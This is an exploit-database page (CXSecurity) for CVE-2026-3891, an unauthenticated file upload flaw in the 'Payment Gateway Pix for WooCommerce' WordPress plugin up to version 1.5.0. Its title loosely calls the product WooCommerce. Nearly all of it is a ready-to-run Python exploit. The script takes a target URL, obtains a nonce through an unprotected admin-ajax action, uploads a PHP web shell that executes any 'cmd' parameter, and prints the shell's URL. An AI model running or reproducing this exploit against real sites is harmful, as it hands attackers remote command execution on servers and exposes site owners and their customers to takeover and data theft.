---
title: WooCommerce 1.5.0 Unauthenticated Arbitrary File Upload
url: https://cxsecurity.com/issue/WLB-2026080011
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-08-21
fetch_date: 2026-08-22T02:50:38.671629
---

# WooCommerce 1.5.0 Unauthenticated Arbitrary File Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WooCommerce 1.5.0 Unauthenticated Arbitrary File Upload** **2026.08.21**  Credit:  **[Mohammad Hossein Sadeghian](https://cxsecurity.com/author/Mohammad%2BHossein%2BSadeghian/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-3891](https://cxsecurity.com/cveshow/CVE-2026-3891/ "Click to see CVE-2026-3891")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

# Exploit Title: WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload
# Google Dork: N/A
# Date: 2026-07-15
# Exploit Author: Mohammad Hossein Sadeghian
# Vendor Homepage: https://wordpress.org/plugins/payment-gateway-pix-for-woocommerce/
# Software Link: https://wordpress.org/plugins/payment-gateway-pix-for-woocommerce/
# Version: <= 1.5.0
# Tested on: Ubuntu 22.04 LTS, Apache 2.4, PHP 8.2, WordPress 6.7
# CVE: CVE-2026-3891
import requests
import sys
def print\_banner():
banner = r"""
\_\_\_\_ \_\_ \_ \_\_ \_\_
/ \_\_ \\_\_\_\_\_\_\_\_ \_\_\_\_ \_\_\_\_\_/ / / | / /\_\_ / /\_
/ / / / \_\_\_/ \_ \/ \_\_ \/ \_\_ / / |/ / \_ \/ \_\_/
/ /\_/ / / / \_\_/ /\_/ / /\_/ / / /| / \_\_/ /\_
/\_\_\_\_\_/\_/ \\_\_\_/\\_\_,\_/\\_\_,\_/ /\_/ |\_/\\_\_\_/\\_\_/
Author: m4sh\_wacker
"""
print(banner)
def main():
print\_banner()
target = input("[?] Enter target URL: ").strip().rstrip("/")
if not target.startswith(("http://", "https://")):
target = "http://" + target
ajax\_url = f"{target}/wp-admin/admin-ajax.php"
filename = "woocommerce.php"
content = '<?php if(isset($\_REQUEST["cmd"])){system($\_REQUEST["cmd"]);} ?>'
session = requests.Session()
print("\n[\*] Requesting nonce...")
try:
response = session.post(
ajax\_url,
data={
"action": "lkn\_pix\_for\_woocommerce\_generate\_nonce",
"action\_name": "lkn\_pix\_for\_woocommerce\_c6\_settings\_nonce"
},
timeout=10
)
result = response.json()
nonce = result["data"]["nonce"]
print(f"[+] Nonce obtained: {nonce}")
except Exception as e:
print(f"[-] Failed to obtain nonce: {e}")
sys.exit(1)
print(f"[\*] Uploading {filename}...")
try:
response = session.post(
ajax\_url,
data={
"action": "lkn\_pix\_for\_woocommerce\_c6\_save\_settings",
"\_ajax\_nonce": nonce
},
files={
"certificate\_crt\_path": (
filename,
content,
"text/plain"
)
},
timeout=10
)
result = response.json()
if not result.get("success"):
print("[-] Upload failed.")
print(response.text)
sys.exit(1)
except Exception as e:
print(f"[-] Upload error: {e}")
sys.exit(1)
uploaded\_url = (
f"{target}/wp-content/plugins/"
f"payment-gateway-pix-for-woocommerce/"
f"Includes/files/certs\_c6/{filename}"
)
print("\n[+] File uploaded successfully!")
print(f"[+] URL: {uploaded\_url}")
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026080011)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top